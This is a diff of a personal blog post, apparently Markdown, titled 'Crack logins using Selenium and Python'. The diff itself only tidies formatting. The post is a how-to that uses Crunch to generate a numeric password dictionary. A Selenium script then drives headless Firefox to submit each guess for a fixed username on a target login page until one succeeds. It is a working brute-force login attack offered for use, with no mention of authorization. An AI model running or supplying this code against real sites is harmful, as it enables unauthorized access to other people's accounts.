@@ -1,14 +1,18 @@
 ---
+slug: "crack-passwd-selenium"
 title: "Crack logins using Selenium and Python"
 date: 2020-10-23T14:58:50+08:00
 draft: false
-tags: ["Python","Selenium"]
+tags: ["Python", "Selenium"]
 categories: ["randomStuff"]
 ---
 
 Using selenium and headless firefox to force crack the website's logins.
+
 <!--more-->
+
 ### Dependencies
+
 - [Python 3](https://www.python.org/downloads/)
 - [Selenium](https://github.com/SeleniumHQ/selenium/)
 - [Crunch](https://tools.kali.org/password-attacks/crunch)
@@ -30,7 +34,7 @@ To install python, simply go to [Download the latest version of Python](https://
 
 // Crunch
     brew install crunch
-    or 
+    or
     apt -y install crunch
     for debian based systems
 
@@ -47,10 +51,12 @@ To install python, simply go to [Download the latest version of Python](https://
 ```
 
 ### Code
+
 #### Generating a dictionary
+
 ```text
 // Usage: crunch <min> <max> [options]
-// For example, I'm generating a dictionary with a minimum password length of 6   
+// For example, I'm generating a dictionary with a minimum password length of 6
 // and the maximum password length of 8, saving it to </path/to/your/dictionary>
 
 crunch 6 8 1234567890 -o /path/to/your/dictionary
@@ -70,26 +76,26 @@ def  loginoa(username,password):
     options.add_argument("--headless")
     # If you prefer a GUI firefox, remove the above line
     driver=selenium.webdriver.Firefox(options=options)
-    
+
     # URL to the login page
     driver.get("link/to/your/login/page")
     time.sleep(2)
 
     # find the input field
     # you could also find those elements by name, class name, xpath, etc
-    user_text=driver.find_element_by_id("session_login") 
+    user_text=driver.find_element_by_id("session_login")
     password_text=driver.find_element_by_id("session_password")
     time.sleep(1)
-    
+
     # send username and password
     user_text.send_keys(username)
     password_text.send_keys(password)
     time.sleep(1)
-    
+
     # find the login button
     # you could also find those elements by name, class name, xpath, etc
-    login=driver.find_element_by_name("commit") 
-    
+    login=driver.find_element_by_name("commit")
+
     # simulate login
     login.click()
     time.sleep(4)
@@ -106,16 +112,16 @@ while True:
     if not passline:
         break
     passlist= passline.split(" # ")
-    
+
     # change 'your username' to a legit username
     islogin=loginoa("your username",passlist[0])
-    
+
     # if successfully logined, break
     print(passlist[0],"login",islogin)
     if  islogin:
         break
 ```
 
-
 ### Reference
-[selenium暴力破解密码，正确密码终止程序](https://www.cnblogs.com/my-global/p/12460987.html)
+
+[selenium 暴力破解密码，正确密码终止程序](https://www.cnblogs.com/my-global/p/12460987.html)
